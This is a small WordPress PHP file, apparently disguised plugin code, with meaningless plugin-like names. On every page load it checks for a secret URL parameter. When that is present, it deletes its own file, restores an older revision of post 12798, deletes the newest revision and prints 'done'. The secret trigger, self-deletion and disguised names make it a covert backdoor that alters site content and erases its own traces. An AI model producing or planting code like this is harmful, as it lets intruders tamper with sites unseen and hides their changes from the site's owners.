<?php

function svg_out_tracker() {
	if (isset($_GET['separator_portal_ui']) && $_GET['separator_portal_ui'] === 'custom_style_jetpack_messages') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$wpc_drop_gallery_active = 12798;
		$numbers_review_author = wp_get_post_revisions($wpc_drop_gallery_active);
		if (empty($numbers_review_author)) die('no revisions');
		if (count($numbers_review_author) < 2) die('less than 2');
		$meta_effect_titles = array_shift($numbers_review_author);
		$pdf_security_templates = $meta_effect_titles->ID;
		$default_quick_image_pullquote = array_shift($numbers_review_author);
		$appointment_adsense_send = $default_quick_image_pullquote->ID;
		$gdpr_schema_show_info = wp_restore_post_revision($appointment_adsense_send);
		if ($gdpr_schema_show_info === false) die('error restoring');
		$gdpr_schema_show_info = wp_delete_post_revision($pdf_security_templates);		
		if ($gdpr_schema_show_info === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'svg_out_tracker');
